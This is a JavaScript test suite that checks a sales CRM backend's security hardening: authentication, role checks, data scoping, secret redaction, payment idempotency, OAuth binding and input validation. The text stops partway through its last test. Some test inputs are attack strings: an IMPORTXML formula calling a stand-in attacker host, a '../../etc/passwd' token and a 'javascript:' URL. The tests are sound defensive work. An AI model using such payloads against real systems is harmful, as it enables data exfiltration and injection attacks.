/**
 * Post-hardening security verification.
 *
 * Every test here is the inverse of a baseline finding: it asserts the
 * attack no longer works. Run:
 *   node --test local/tests/security-rbac.test.mjs
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { buildScenario, loginAs, authPost, authGet, PASSWORDS, ID } from '../harness/scenario.mjs';

/* ================================================================== *
 * Authentication
 * ================================================================== */

test('AUTH-1: valid credentials mint a session', () => {
  const be = buildScenario();
  const res = be.post({
    action: 'login',
    payload: { username: 'super_admin', password: PASSWORDS[ID.superAdmin] },
  });
  assert.equal(res.status, 'success');
  assert.ok(res.data.token, 'a token is issued');
  assert.equal(res.data.user.Username, 'super_admin');
  assert.equal(res.data.user.PasswordHash, undefined, 'hash never leaves the server');
});

test('AUTH-2: wrong password is rejected, with no user enumeration', () => {
  const be = buildScenario();
  const wrongPw = be.post({
    action: 'login', payload: { username: 'super_admin', password: 'not-the-password' },
  });
  const noUser = be.post({
    action: 'login', payload: { username: 'does_not_exist', password: 'whatever123' },
  });

  assert.equal(wrongPw.status, 'error');
  assert.equal(wrongPw.code, 'INVALID_CREDENTIALS');
  assert.equal(noUser.code, 'INVALID_CREDENTIALS');
  assert.equal(wrongPw.message, noUser.message, 'identical message prevents enumeration');
});

test('AUTH-3: any password no longer works (the original critical defect)', () => {
  const be = buildScenario();
  for (const pw of ['', 'x', 'password', 'anything at all']) {
    const res = be.post({ action: 'login', payload: { username: 'super_admin', password: pw } });
    assert.equal(res.status, 'error', `password "${pw}" must be rejected`);
  }
});

test('AUTH-4: a deactivated account cannot authenticate', () => {
  const be = buildScenario();
  const res = be.post({
    action: 'login',
    payload: { username: 'rep_deactivated', password: PASSWORDS[ID.repInactive] },
  });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'ACCOUNT_INACTIVE');
});

test('AUTH-5: protected actions require a session when enforcement is on', () => {
  const be = buildScenario();
  for (const action of ['getUsers', 'getLeads', 'getDeals', 'getCommissions', 'getKPIs']) {
    const res = be.get({ action });
    assert.equal(res.status, 'error', `${action} must require auth`);
    assert.equal(res.code, 'UNAUTHENTICATED');
  }
});

test('AUTH-6: forged and malformed tokens are rejected', () => {
  const be = buildScenario();
  for (const token of ['', 'not-a-token', ID.superAdmin, 'a.b', '../../etc/passwd']) {
    const res = be.get({ action: 'getUsers', token });
    assert.equal(res.status, 'error');
    assert.ok(['UNAUTHENTICATED'].includes(res.code));
  }
});

test('AUTH-7: logout revokes the session immediately', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  assert.equal(authGet(be, token, 'getUsers').status, 'success');

  authPost(be, token, 'logout');
  const after = authGet(be, token, 'getUsers');
  assert.equal(after.status, 'error');
  assert.equal(after.code, 'UNAUTHENTICATED');
});

test('AUTH-8: sessions expire', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);
  assert.equal(authGet(be, token, 'getLeads').status, 'success');

  be.advanceTime(13 * 60 * 60 * 1000); // TTL is 12h
  const after = authGet(be, token, 'getLeads');
  assert.equal(after.status, 'error');
  assert.equal(after.code, 'UNAUTHENTICATED');
});

test('AUTH-9: deactivating a user kills their live session at once', () => {
  const be = buildScenario();
  const victim = loginAs(be, ID.repAlpha1);
  const admin = loginAs(be, ID.superAdmin);

  assert.equal(authGet(be, victim, 'getLeads').status, 'success');

  const deact = authPost(be, admin, 'deactivateUser', { id: ID.repAlpha1 });
  assert.equal(deact.status, 'success');

  const after = authGet(be, victim, 'getLeads');
  assert.equal(after.status, 'error', 'the revoked session must stop working');
  assert.equal(after.code, 'UNAUTHENTICATED');
});

test('AUTH-10: repeated failures lock the account', () => {
  const be = buildScenario();
  let locked = false;
  for (let i = 0; i < 10; i++) {
    const res = be.post({
      action: 'login', payload: { username: 'sales_rep_1', password: 'wrong-password' },
    });
    if (res.code === 'ACCOUNT_LOCKED') { locked = true; break; }
  }
  assert.ok(locked, 'brute force must eventually lock the account');
});

/* ================================================================== *
 * Authorization / RBAC
 * ================================================================== */

test('RBAC-1: role cannot be forged through the request payload', () => {
  const be = buildScenario();
  const repToken = loginAs(be, ID.repAlpha1);

  // Claim SUPER_ADMIN in every way a client could.
  const res = be.post({
    action: 'getKPIs',
    token: repToken,
    payload: { role: 'SUPER_ADMIN', userId: ID.superAdmin, id: ID.superAdmin },
  });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'FORBIDDEN');
});

test('RBAC-2: finance is SUPER_ADMIN only', () => {
  const be = buildScenario();
  const cases = [
    [ID.superAdmin, 'success'],
    [ID.adminAlpha, 'error'],
    [ID.repAlpha1, 'error'],
    [ID.setterAlpha, 'error'],
  ];
  for (const [userId, expected] of cases) {
    const token = loginAs(be, userId);
    const res = authGet(be, token, 'getKPIs');
    assert.equal(res.status, expected, `getKPIs for ${userId}`);
  }
});

test('RBAC-3: only SUPER_ADMIN may mark a deal won', () => {
  const be = buildScenario();
  for (const userId of [ID.adminAlpha, ID.repAlpha1, ID.setterAlpha]) {
    const token = loginAs(be, userId);
    const res = authPost(be, token, 'markDealWon', { dealId: ID.dealAlphaOpen });
    assert.equal(res.status, 'error', `${userId} must not win deals`);
    assert.equal(res.code, 'FORBIDDEN');
  }
  const su = loginAs(be, ID.superAdmin);
  assert.equal(authPost(be, su, 'markDealWon', { dealId: ID.dealAlphaOpen }).status, 'success');
});

test('RBAC-4: the legacy updateDeal(Status=Won) path is gated too', () => {
  const be = buildScenario();
  const rep = loginAs(be, ID.repAlpha1);
  const res = authPost(be, rep, 'updateDeal', { id: ID.dealAlphaOpen, Status: 'Won' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'FORBIDDEN');
});

test('RBAC-5: a rep cannot promote themselves', () => {
  const be = buildScenario();
  const rep = loginAs(be, ID.repAlpha1);
  const res = authPost(be, rep, 'updateUser', { id: ID.repAlpha1, Role: 'SUPER_ADMIN' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'FORBIDDEN');

  const row = be.rows('Users').find((u) => u.ID === ID.repAlpha1);
  assert.equal(row.Role, 'SALES_REP', 'role is unchanged');
});

test('RBAC-6: an ADMIN cannot mint a SUPER_ADMIN', () => {
  const be = buildScenario();
  const admin = loginAs(be, ID.adminAlpha);

  const created = authPost(be, admin, 'createUser', {
    Username: 'sneaky_admin', Role: 'SUPER_ADMIN', Team: 'Alpha',
    Status: 'Active', Password: 'TotallyLegit1',
  });

  if (created.status === 'success') {
    assert.notEqual(created.data.Role, 'SUPER_ADMIN',
      'the SUPER_ADMIN role must be stripped');
  } else {
    assert.equal(created.code, 'VALIDATION_FAILED');
  }
});

test('RBAC-7: an ADMIN cannot modify a SUPER_ADMIN account', () => {
  const be = buildScenario();
  const admin = loginAs(be, ID.adminAlpha);
  const res = authPost(be, admin, 'updateUser', { id: ID.superAdmin, Status: 'Inactive' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'FORBIDDEN');
});

test('RBAC-8: the last SUPER_ADMIN cannot be demoted or disabled', () => {
  const be = buildScenario();
  const su = loginAs(be, ID.superAdmin);
  const res = authPost(be, su, 'updateUser', { id: ID.superAdmin, Role: 'SALES_REP' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'CONFLICT');
});

/* ================================================================== *
 * Record scoping / data isolation
 * ================================================================== */

test('SCOPE-1: a rep sees only their own leads', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);
  const res = authGet(be, token, 'getLeads');

  assert.equal(res.status, 'success');
  const ids = res.data.map((l) => l.ID);
  assert.ok(ids.includes(ID.leadAlphaNew), 'own lead visible');
  assert.ok(!ids.includes(ID.leadBetaNew), 'another team\'s lead hidden');
  assert.ok(!ids.includes(ID.leadUnassigned), 'unassigned lead hidden');
});

test('SCOPE-2: a rep cannot fetch another rep\'s lead by ID', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);
  const res = authGet(be, token, 'getLeadById', { id: ID.leadBetaNew });

  assert.equal(res.status, 'error');
  assert.equal(res.code, 'NOT_FOUND', 'NOT_FOUND, not FORBIDDEN — no existence oracle');
});

test('SCOPE-3: a rep cannot write to another rep\'s lead', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);
  const res = authPost(be, token, 'updateLead', { id: ID.leadBetaNew, Notes: 'pwned' });

  assert.equal(res.status, 'error');
  const row = be.rows('Leads').find((l) => l.ID === ID.leadBetaNew);
  assert.notEqual(row.Notes, 'pwned', 'the record is untouched');
});

test('SCOPE-4: an ADMIN sees their own team but not the other', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.adminAlpha);
  const res = authGet(be, token, 'getLeads');

  const ids = res.data.map((l) => l.ID);
  assert.ok(ids.includes(ID.leadAlphaNew), 'Alpha lead visible to Alpha admin');
  assert.ok(!ids.includes(ID.leadBetaNew), 'Beta lead hidden from Alpha admin');
});

test('SCOPE-5: SUPER_ADMIN sees everything', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  const res = authGet(be, token, 'getLeads');
  assert.equal(res.data.length, 7, 'all fixture leads');
});

test('SCOPE-6: a rep sees only commissions attributed to them', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repBeta1);
  const res = authGet(be, token, 'getCommissions');

  assert.equal(res.status, 'success');
  for (const c of res.data) {
    assert.ok(
      c.SetterId === ID.repBeta1 || c.CloserId === ID.repBeta1,
      'only own commissions returned'
    );
  }
});

/* ================================================================== *
 * Secret handling
 * ================================================================== */

test('SECRET-1: getUsers never returns hashes or refresh tokens', () => {
  const be = buildScenario();
  be.call('updateRecordRaw', 'Users', ID.repAlpha1, { ZohoRefreshToken: 'SECRET-TOKEN' });

  const token = loginAs(be, ID.superAdmin);
  const res = authGet(be, token, 'getUsers');
  assert.equal(res.status, 'success');

  const serialised = JSON.stringify(res.data);
  assert.ok(!serialised.includes('SECRET-TOKEN'), 'no refresh token in the payload');
  for (const u of res.data) {
    assert.equal(u.PasswordHash, undefined);
    assert.equal(u.PasswordSalt, undefined);
    assert.equal(u.ZohoRefreshToken, undefined);
  }
});

test('SECRET-2: link status is still available to the UI as a boolean', () => {
  const be = buildScenario();
  be.call('updateRecordRaw', 'Users', ID.repAlpha1, { ZohoRefreshToken: 'SECRET-TOKEN' });

  const token = loginAs(be, ID.superAdmin);
  const users = authGet(be, token, 'getUsers').data;
  const linked = users.find((u) => u.ID === ID.repAlpha1);
  const unlinked = users.find((u) => u.ID === ID.repAlpha2);

  assert.equal(linked.ZohoLinked, true);
  assert.equal(unlinked.ZohoLinked, false);
});

/* ================================================================== *
 * Financial integrity
 * ================================================================== */

test('MONEY-1: replaying markDealWon creates exactly one commission', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  const results = [];
  for (let i = 0; i < 5; i++) {
    results.push(authPost(be, token, 'markDealWon', { dealId: ID.dealAlphaOpen }));
  }

  for (const r of results) assert.equal(r.status, 'success');
  assert.equal(results[0].data.idempotent, false, 'first call does the work');
  for (let i = 1; i < 5; i++) {
    assert.equal(results[i].data.idempotent, true, `call ${i + 1} is a replay`);
  }

  const commissions = be.rows('Commissions').filter((c) => c.DealId === ID.dealAlphaOpen);
  assert.equal(commissions.length, 1, 'exactly one commission for the deal');
});

test('MONEY-2: concurrent markDealWon executions cannot both write', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  // Re-enter the API mid-transaction, right before the Deals write. This is
  // the read-modify-write window a second Apps Script execution would hit.
  let reentrantResult = null;
  be.store.onOperation('write', 'Deals', () => {
    reentrantResult = authPost(be, token, 'markDealWon', { dealId: ID.dealAlphaOpen });
  });

  const first = authPost(be, token, 'markDealWon', { dealId: ID.dealAlphaOpen });
  be.store.clearHooks();

  assert.equal(first.status, 'success');
  assert.ok(reentrantResult, 'the re-entrant call ran');
  assert.equal(reentrantResult.status, 'error', 'it must not succeed');
  assert.equal(reentrantResult.code, 'LOCK_TIMEOUT', 'it is refused by the lock');

  const commissions = be.rows('Commissions').filter((c) => c.DealId === ID.dealAlphaOpen);
  assert.equal(commissions.length, 1, 'still exactly one commission');
});

test('MONEY-3: a paid commission cannot be paid twice', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  const first = authPost(be, token, 'processCommission', { commissionId: ID.commBetaPending });
  assert.equal(first.status, 'success');
  assert.equal(first.data.idempotent, false);

  const second = authPost(be, token, 'processCommission', { commissionId: ID.commBetaPending });
  assert.equal(second.status, 'success');
  assert.equal(second.data.idempotent, true, 'second settlement is a no-op');

  const payouts = be.rows('Logs').filter((l) => l.Action === 'PAYOUT_PROCESSED');
  assert.equal(payouts.length, 1, 'only one payout event was recorded');
});

test('MONEY-4: a paid commission cannot be revised', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  const res = authPost(be, token, 'reviseCommission', {
    dealId: ID.dealAlphaWon, setterAmount: 999999,
  });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'CONFLICT');
});

test('MONEY-5: revising an unpaid commission amends it rather than duplicating', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  authPost(be, token, 'markDealWon', { dealId: ID.dealAlphaOpen });
  const before = be.rows('Commissions').filter((c) => c.DealId === ID.dealAlphaOpen);
  assert.equal(before.length, 1);

  const revised = authPost(be, token, 'reviseCommission', {
    dealId: ID.dealAlphaOpen, setterAmount: 4321, closerAmount: 8765,
  });
  assert.equal(revised.status, 'success');

  const after = be.rows('Commissions').filter((c) => c.DealId === ID.dealAlphaOpen);
  assert.equal(after.length, 1, 'still one row — revised, not duplicated');
  assert.equal(Number(after[0].SetterAmount), 4321);
  assert.equal(Number(after[0].CloserAmount), 8765);

  const audit = be.rows('Logs').filter((l) => l.Action === 'COMMISSION_REVISED');
  assert.equal(audit.length, 1, 'the revision is audited');
});

test('MONEY-6: negative and non-numeric deal values are rejected', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  for (const value of [-1, -999999, 'abc']) {
    const res = authPost(be, token, 'updateDeal', { id: ID.dealAlphaOpen, Value: value });
    assert.equal(res.status, 'error', `value ${value} must be rejected`);
    assert.equal(res.code, 'VALIDATION_FAILED');
  }
});

test('MONEY-7: a deal cannot be moved to an arbitrary status', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  const res = authPost(be, token, 'updateDeal', { id: ID.dealAlphaOpen, Status: 'BANANA' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'VALIDATION_FAILED');
});

test('MONEY-8: a won deal is terminal — it cannot be reopened', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  const res = authPost(be, token, 'updateDeal', { id: ID.dealAlphaWon, Status: 'Open' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'ILLEGAL_TRANSITION');
});

/* ================================================================== *
 * Lead lifecycle
 * ================================================================== */

test('LEAD-1: converting a lead is atomic and idempotent', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  // leadAlphaNew has no deal yet. New -> Converted is not a legal jump, so
  // qualify it first; that also exercises the lead state machine.
  assert.equal(
    authPost(be, token, 'updateLead', { id: ID.leadAlphaNew, Status: 'Qualified' }).status,
    'success'
  );

  const first = authPost(be, token, 'convertLead', { leadId: ID.leadAlphaNew, value: 30000 });
  assert.equal(first.status, 'success');
  assert.equal(first.data.idempotent, false);

  const second = authPost(be, token, 'convertLead', { leadId: ID.leadAlphaNew, value: 30000 });
  assert.equal(second.status, 'success');
  assert.equal(second.data.idempotent, true);

  const deals = be.rows('Deals').filter((d) => d.LeadId === ID.leadAlphaNew);
  assert.equal(deals.length, 1, 'only one deal was created');

  const lead = be.rows('Leads').find((l) => l.ID === ID.leadAlphaNew);
  assert.equal(lead.Status, 'Converted');
});

test('LEAD-1b: a lead that already has a deal is never given a second one', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  // leadAlphaQualified already has dealAlphaOpen, but is not marked Converted
  // — exactly the half-finished state the old client-side flow could leave.
  const before = be.rows('Deals').filter((d) => d.LeadId === ID.leadAlphaQualified).length;
  assert.equal(before, 1);

  const res = authPost(be, token, 'convertLead', { leadId: ID.leadAlphaQualified, value: 30000 });
  assert.equal(res.status, 'success');
  assert.equal(res.data.idempotent, true, 'returns the existing deal');
  assert.equal(res.data.deal.ID, ID.dealAlphaOpen);

  const after = be.rows('Deals').filter((d) => d.LeadId === ID.leadAlphaQualified).length;
  assert.equal(after, 1, 'no duplicate deal');

  const lead = be.rows('Leads').find((l) => l.ID === ID.leadAlphaQualified);
  assert.equal(lead.Status, 'Converted', 'the inconsistent lead status was repaired');

  // Direct createDeal is guarded by the same invariant.
  const dup = authPost(be, token, 'createDeal', { LeadId: ID.leadAlphaQualified, Value: 100 });
  assert.equal(dup.status, 'error');
  assert.equal(dup.code, 'DUPLICATE');
});

test('LEAD-2: a failed lead write rolls the created deal back', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  const dealsBefore = be.rows('Deals').length;

  // Let the Deals append succeed, then fail the Leads status write.
  be.store.faults.arm({ on: 'write', sheet: 'Leads', times: 1 });
  const res = authPost(be, token, 'convertLead', { leadId: ID.leadAlphaQualified, value: 30000 });
  be.store.faults.clear();

  assert.equal(res.status, 'error', 'the caller is told it failed');

  const dealsAfter = be.rows('Deals').length;
  assert.equal(dealsAfter, dealsBefore, 'no orphaned deal was left behind');

  const lead = be.rows('Leads').find((l) => l.ID === ID.leadAlphaQualified);
  assert.notEqual(lead.Status, 'Converted', 'the lead was not half-converted');
});

test('LEAD-3: an already-converted lead cannot be reverted to New', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  const res = authPost(be, token, 'updateLead', { id: ID.leadAlphaConverted, Status: 'New' });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'ILLEGAL_TRANSITION');
});

/* ================================================================== *
 * Zoho isolation
 * ================================================================== */

test('ZOHO-1: a user without a link cannot send from someone else\'s mailbox', () => {
  const be = buildScenario();

  const beta = be.zoho.addAccount({ email: 'beta.rep@tjgroups.test' });
  be.call('updateRecordRaw', 'Users', ID.repBeta1, {
    ZohoEmail: beta.email, ZohoRefreshToken: beta.refreshToken,
  });

  const alphaToken = loginAs(be, ID.repAlpha1);
  const res = authPost(be, alphaToken, 'sendZohoEmail', {
    to: 'target@example.test', subject: 'probe', content: 'body',
  });

  assert.equal(res.status, 'error', 'must be refused');
  assert.equal(be.zoho.sentMail.length, 0, 'nothing was sent');
});

test('ZOHO-2: naming another user in the payload does not switch mailbox', () => {
  const be = buildScenario();

  const alpha = be.zoho.addAccount({ email: 'alpha.rep@tjgroups.test' });
  const beta = be.zoho.addAccount({ email: 'beta.rep@tjgroups.test' });
  be.call('updateRecordRaw', 'Users', ID.repAlpha1, {
    ZohoEmail: alpha.email, ZohoRefreshToken: alpha.refreshToken,
  });
  be.call('updateRecordRaw', 'Users', ID.repBeta1, {
    ZohoEmail: beta.email, ZohoRefreshToken: beta.refreshToken,
  });

  const alphaToken = loginAs(be, ID.repAlpha1);
  const res = authPost(be, alphaToken, 'sendZohoEmail', {
    userId: ID.repBeta1,           // attacker names the victim
    to: 'target@example.test', subject: 'probe', content: 'body',
  });

  assert.equal(res.status, 'success');
  assert.equal(be.zoho.sentMail.length, 1);
  assert.equal(
    be.zoho.sentMail[0].fromMailbox, alpha.email,
    'sent from the caller\'s own mailbox, not the named one'
  );
});

test('ZOHO-3: mailbox reads are scoped to the caller', () => {
  const be = buildScenario();

  const beta = be.zoho.addAccount({ email: 'beta.rep@tjgroups.test' });
  be.zoho.addMessage(beta.accountId, {
    subject: 'Confidential', content: 'secret',
    sender: 'client@wingtip.test', toAddress: beta.email,
  });
  be.call('updateRecordRaw', 'Users', ID.repBeta1, {
    ZohoEmail: beta.email, ZohoRefreshToken: beta.refreshToken,
  });

  const alphaToken = loginAs(be, ID.repAlpha1);
  const res = authGet(be, alphaToken, 'getZohoEmails', {
    leadEmail: 'client@wingtip.test', userId: ID.repBeta1,
  });

  assert.equal(res.status, 'error', 'unlinked user gets an error, not another inbox');
});

test('ZOHO-4: the OAuth state is bound to one user', () => {
  const be = buildScenario();
  const alphaToken = loginAs(be, ID.repAlpha1);
  const betaToken = loginAs(be, ID.repBeta1);

  const urlRes = authPost(be, alphaToken, 'getZohoAuthUrl', {});
  assert.equal(urlRes.status, 'success');
  const state = urlRes.data.state;

  const acct = be.zoho.addAccount({ email: 'victim@tjgroups.test' });
  const code = be.zoho.issueAuthCode({ refreshToken: acct.refreshToken });

  // Beta tries to redeem Alpha's state.
  const stolen = authPost(be, betaToken, 'linkZoho', { code, state });
  assert.equal(stolen.status, 'error');
  assert.equal(stolen.code, 'FORBIDDEN');
});

test('ZOHO-5: an authorization code cannot be replayed', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  const urlRes = authPost(be, token, 'getZohoAuthUrl', {});
  const acct = be.zoho.addAccount({ email: 'alpha@tjgroups.test' });
  const code = be.zoho.issueAuthCode({ refreshToken: acct.refreshToken });

  const first = authPost(be, token, 'linkZoho', { code, state: urlRes.data.state });
  assert.equal(first.status, 'success');

  const replay = authPost(be, token, 'linkZoho', { code, state: urlRes.data.state });
  assert.equal(replay.status, 'error', 'a consumed code must not work again');
});

/* ================================================================== *
 * Input handling
 * ================================================================== */

test('INPUT-1: formula injection is neutralised server-side', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  const res = authPost(be, token, 'createLead', {
    Name: 'Formula Probe',
    Notes: '=IMPORTXML("http://evil.test","//x")',
  });
  assert.equal(res.status, 'success');

  const row = be.rows('Leads').find((l) => l.ID === res.data.ID);
  assert.ok(String(row.Notes).startsWith("'="), 'stored as text, not a formula');
});

test('INPUT-2: malformed JSON gets a clear error, not a crash', () => {
  const be = buildScenario();
  const res = be.postRaw('{ this is not json');
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'BAD_REQUEST');
});

test('INPUT-3: unknown actions are rejected explicitly', () => {
  const be = buildScenario();
  const res = be.post({ action: 'dropAllTables', payload: {} });
  assert.equal(res.status, 'error');
  assert.equal(res.code, 'UNKNOWN_ACTION');
});

test('INPUT-4: oversized and invalid field values are rejected', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  const huge = authPost(be, token, 'createLead', { Name: 'X'.repeat(5000) });
  assert.equal(huge.status, 'error');

  const badEmail = authPost(be, token, 'createLead', { Name: 'Ok', Email: 'not-an-email' });
  assert.equal(badEmail.status, 'error');

  const badUrl = authPost(be, token, 'createLead', { Name: 'Ok', Linkedin: 'javascript:alert(1)' });
  assert.equal(badUrl.status, 'error');
});

test('INPUT-5: server-owned fields cannot be overwritten by the client', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  const res = authPost(be, token, 'createLead', {
    Name: 'Field Probe',
    ID: 'attacker-chosen-id',
    CreatedAt: '1999-01-01T00:00:00.000Z',
  });
  assert.equal(res.status, 'success');
  assert.notEqual(res.data.ID, 'attacker-chosen-id', 'server mints the ID');
  assert.notEqual(res.data.CreatedAt, '1999-01-01T00:00:00.000Z');
});

/* ================================================================== *
 * Error semantics
 * ================================================================== */

test('ERROR-1: a storage outage is distinguishable from an empty result', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  be.store.faults.arm({ on: 'read', sheet: 'Leads', times: 1 });
  const failed = authGet(be, token, 'getLeads');
  be.store.faults.clear();

  assert.equal(failed.status, 'error');
  assert.equal(failed.code, 'STORAGE_ERROR');
  assert.equal(failed.retryable, true);

  // An genuinely empty sheet is a success with zero rows.
  be.store.getSheet('Leads').rows = [be.store.getSheet('Leads').headers];
  const empty = authGet(be, token, 'getLeads');
  assert.equal(empty.status, 'success');
  assert.deepEqual(empty.data, []);
});

test('ERROR-2: every error carries a stable machine-readable code', () => {
  const be = buildScenario();
  const probes = [
    be.get({ action: 'getLeads' }),
    be.post({ action: 'nope', payload: {} }),
    be.post({ action: 'login', payload: { username: 'super_admin', password: 'bad' } }),
  ];
  for (const p of probes) {
    assert.equal(p.status, 'error');
    assert.ok(typeof p.code === 'string' && p.code.length > 0);
    assert.ok(typeof p.httpStatus === 'number');
    assert.equal(typeof p.retryable, 'boolean');
  }
});

/* ================================================================== *
 * Audit
 * ================================================================== */

test('AUDIT-1: financial and identity mutations are recorded with an actor', () => {
  const be = buildScenario();
  const su = loginAs(be, ID.superAdmin);

  authPost(be, su, 'markDealWon', { dealId: ID.dealAlphaOpen });
  authPost(be, su, 'processCommission', { commissionId: ID.commBetaPending });
  authPost(be, su, 'updateUser', { id: ID.repAlpha1, Team: 'Beta' });

  const logs = be.rows('Logs');
  for (const action of ['LOGIN', 'DEAL_WON', 'PAYOUT_PROCESSED', 'USER_UPDATED']) {
    const entry = logs.find((l) => l.Action === action);
    assert.ok(entry, `${action} was logged`);
    assert.ok(String(entry.UserId).length > 0, `${action} has an actor`);
    assert.ok(String(entry.Timestamp).length > 0, `${action} has a timestamp`);
  }
});

test('AUDIT-2: the actor cannot be forged on createLog', () => {
  const be = buildScenario();
  const rep = loginAs(be, ID.repAlpha1);

  authPost(be, rep, 'createLog', {
    EntityId: ID.leadAlphaNew, EntityType: 'Lead',
    Action: 'NOTE', UserId: ID.superAdmin, Details: 'impersonation attempt',
  });

  const entry = be.rows('Logs').find((l) => l.Details === 'impersonation attempt');
  assert.ok(entry);
  assert.equal(entry.UserId, ID.repAlpha1, 'attributed to the real caller');
});

test('AUDIT-3: writes from one request share a correlation id', () => {
  const be = buildScenario();
  const su = loginAs(be, ID.superAdmin);
  const res = authPost(be, su, 'markDealWon', { dealId: ID.dealAlphaOpen });

  assert.ok(res.requestId, 'the response carries a request id');
  const entry = be.rows('Logs').find((l) => l.Action === 'DEAL_WON');
  assert.equal(entry.RequestId, res.requestId);
});

/* ================================================================== *
 * Rollout compatibility
 * ================================================================== */

test('ROLLOUT-1: with enforcement off, the existing frontend still works', () => {
  const be = buildScenario({ enforcement: 'off' });

  // No token — exactly what today's deployed client sends.
  const leads = be.get({ action: 'getLeads' });
  assert.equal(leads.status, 'success', 'legacy unauthenticated read still succeeds');

  const created = be.post({
    action: 'createLead',
    payload: { Name: 'Legacy Client Lead', Status: 'New' },
  });
  assert.equal(created.status, 'success', 'legacy write still succeeds');
});

test('ROLLOUT-2: secrets are redacted even in off mode', () => {
  const be = buildScenario({ enforcement: 'off' });
  be.call('updateRecordRaw', 'Users', ID.repAlpha1, { ZohoRefreshToken: 'SECRET-TOKEN' });

  const res = be.get({ action: 'getUsers' });
  assert.equal(res.status, 'success');
  assert.ok(!JSON.stringify(res.data).includes('SECRET-TOKEN'),
    'redaction is not gated on enforcement');
});

test('ROLLOUT-3: commission idempotency applies even in off mode', () => {
  const be = buildScenario({ enforcement: 'off' });

  for (let i = 0; i < 3; i++) {
    be.post({ action: 'updateDeal', payload: { id: ID.dealAlphaOpen, Status: 'Won' } });
  }
  const commissions = be.rows('Commissions').filter((c) => c.DealId === ID.dealAlphaOpen);
  assert.equal(commissions.length, 1, 'no duplicates even without auth');
});

test('ROLLOUT-4: warn mode records unauthenticated calls', () => {
  const be = buildScenario({ enforcement: 'warn' });
  be.get({ action: 'getLeads' });

  const warned = be.rows('Logs').filter((l) => l.Action === 'UNAUTHENTICATED_CALL');
  assert.ok(warned.length > 0, 'anonymous access is visible in the audit log');
});

/* ================================================================== *
 * Apps Script API fidelity
 *
 * The harness must not accept calls the real platform rejects. Every one of
 * these reproduces a signature Apps Script enforces.
 * ================================================================== */

test('APPSCRIPT-1: HMAC refuses a mixed Byte[]/String call, as the platform does', () => {
  const be = buildScenario();
  const U = be.context.Utilities;

  const digest = U.computeHmacSha256Signature('some value', 'some key');

  assert.throws(
    () => U.computeHmacSha256Signature(digest, 'some key'),
    /don't match the method signature/,
    'the mock accepted (Byte[], String). Apps Script does not, and a hash loop ' +
    'written this way fails on every account in production.'
  );
});

test('APPSCRIPT-2: both supported overloads still work', () => {
  const be = buildScenario();
  const U = be.context.Utilities;

  const a = U.computeHmacSha256Signature('value', 'key');
  assert.ok(Array.isArray(a) && a.length === 32, '(String, String) must work');

  const keyBytes = U.newBlob('key').getBytes();
  const b = U.computeHmacSha256Signature(a, keyBytes);
  assert.ok(Array.isArray(b) && b.length === 32, '(Byte[], Byte[]) must work');
});

test('APPSCRIPT-3: password hashing survives many iterations', () => {
  const be = buildScenario();

  // The real default is 750 rounds; every round after the first feeds a
  // Byte[] digest back in. If the key is not also bytes, this throws.
  const hash = be.call('hashPassword', 'SomePassword123', 'somesalt', 750);

  assert.match(hash, /^[0-9a-f]{64}$/, `not a sha256 hex digest: ${hash}`);

  const again = be.call('hashPassword', 'SomePassword123', 'somesalt', 750);
  assert.equal(again, hash, 'hashing is not deterministic');

  const other = be.call('hashPassword', 'SomePassword123', 'differentsalt', 750);
  assert.notEqual(other, hash, 'the salt is not affecting the result');
});

test('APPSCRIPT-4: a real login round-trip works at production iteration count', () => {
  const be = buildScenario();
  be.setProp('PASSWORD_ITERATIONS', '750');

  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'RealWorldPass99', { mustChange: false });

  const ok = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'RealWorldPass99' },
  }))._raw);
  assert.equal(ok.status, 'success', `login failed: ${ok.message}`);

  const bad = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'WrongPass99' },
  }))._raw);
  assert.equal(bad.status, 'error', 'a wrong password was accepted');
});

test('APPSCRIPT-5: MustChangePassword is advisory and never locks anyone out', () => {
  const be = buildScenario();
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');

  be.call('setUserPassword', user.ID, 'ExposedPass12', { mustChange: true });

